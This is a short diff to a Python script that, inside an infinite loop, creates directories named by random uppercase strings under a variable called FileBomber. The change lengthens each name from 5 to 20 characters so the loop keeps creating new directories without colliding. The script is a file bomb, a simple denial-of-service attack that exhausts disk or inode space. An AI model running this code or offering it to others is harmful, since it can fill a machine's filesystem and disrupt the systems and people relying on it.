@@ -6,6 +6,6 @@ from os import mkdir
 
 while True:
     
-    FileBomber = RandString('uppercase',5)
+    FileBomber = RandString('uppercase',20)
 
     mkdir(FileBomber)
